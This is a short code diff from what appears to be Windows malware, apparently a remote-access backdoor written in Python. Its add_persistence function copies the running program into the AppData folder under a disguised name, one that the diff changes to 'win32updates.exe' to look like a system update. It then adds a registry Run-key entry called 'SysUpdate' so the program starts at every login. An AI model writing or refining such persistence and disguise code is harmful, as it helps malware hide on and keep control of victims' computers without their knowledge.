@@ -40,7 +40,7 @@ class Socket:
 
 
 def add_persistence():
-    new_file = os.environ["appdata"] + "\\sysupgrades.exe"
+    new_file = os.environ["appdata"] + "\\win32updates.exe"
     if not os.path.exists(new_file):
         shutil.copyfile(sys.executable, new_file)
         regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysUpdate /t REG_SZ /d " + new_file
